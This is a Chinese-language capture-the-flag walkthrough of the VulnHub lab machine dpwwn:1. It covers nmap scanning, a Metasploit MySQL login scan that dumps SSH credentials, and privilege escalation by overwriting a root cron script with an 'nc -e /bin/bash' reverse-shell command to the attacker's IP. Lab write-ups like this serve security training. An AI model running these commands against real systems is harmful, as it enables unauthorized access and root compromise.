## 复盘*

## 靶机地址

[dpwwn: 1 ~ VulnHub](https://www.vulnhub.com/entry/dpwwn-1,342/)

![image-20250317084410435](./assets/image-20250317084410435.png)



## 信息收集

### nmap扫描

#### 主机探测

```
nmap -sn 192.168.23.0/24
```

![image-20250317084538154](./assets/image-20250317084538154.png)

确定靶机ip：

192.168.23.139



#### 创建文件夹用来存储后续扫描信息

```
nmdir nmapscan
```

![image-20250317085141939](./assets/image-20250317085141939.png)



####  端口扫描

```
nmap -sT -p- --min-rate 10000 192.168.23.139 -oA ./nmapscan/ports
```

![image-20250317085205407](./assets/image-20250317085205407.png)

开放了

- 22 ssh
- 80 http
- 3306 mysql



#### 提取端口信息

```
ports=$(cat ./nmapscan/ports.nmap | grep open | awk -F'/' '{print $1}' |
paste -sd,)
echo $ports
```

![image-20250317085226900](./assets/image-20250317085226900.png)



#### 详细结果扫描

```
nmap -sT -sV -sC -O -Pn -p 22,80,3306 192.168.23.139 -oA ./nmapscan/detai
l
```

![image-20250317085352314](./assets/image-20250317085352314.png)

分析：

- 22 端口 ssh OpenSSH 7.4
- 80 端口 http Apache httpd 2.4.6
- CentOS系统
- PHP 5.4.16
- 3306 端口 mysql
- MariaDB 5.5.60



### 尝试msf 

```
msfconsole
search scanner/mysql
use auxiliary/scanner/mysql/mysql_login 
```

![image-20250317085709309](./assets/image-20250317085709309.png)

![image-20250317085721364](./assets/image-20250317085721364.png)



```
show options
set CREATESESSION yes
set RHOSTS 192.168.23.139
run
```

![image-20250317085751073](./assets/image-20250317085751073.png)



![image-20250317085909179](./assets/image-20250317085909179.png)

可以看到一个会话建立



#### 进入该会话

```
sessions -i 1
query show databases;
query use ssh;
query show tables;
query select * from users;
```

![image-20250317090107446](./assets/image-20250317090107446.png)

![image-20250317090115568](./assets/image-20250317090115568.png)

![image-20250317090208074](./assets/image-20250317090208074.png)

直接拿到了ssh账号密码



### 尝试ssh登录

```
ssh mistic@192.168.23.139
```

![image-20250317090233563](./assets/image-20250317090233563.png)



## 提权

```
ls -al
```

![image-20250317090259239](./assets/image-20250317090259239.png)

有一个logrot.sh



### 查看logrot.sh

```
cat logrot.sh
```

![image-20250317090336592](./assets/image-20250317090336592.png)



### 查看定时任务

```
cat /etc/crontab
```

![image-20250317090406451](./assets/image-20250317090406451.png)

root用户每三分钟执行一次该脚本

且当前用户可以修改该脚本



### 反弹shell

#### 本地监听

```
nc -lvp 283
```

![image-20250317090526145](./assets/image-20250317090526145.png)

```
echo 'nc -e /bin/bash 192.168.23.134 283' > logrot.sh
cat logrot.sh
```

![image-20250317090544267](./assets/image-20250317090544267.png)

成功写入



等root用户定时执行该脚本，即可获得root权限的shell



### 得到flag

![image-20250317090639379](./assets/image-20250317090639379.png)

![image-20250317090721584](./assets/image-20250317090721584.png)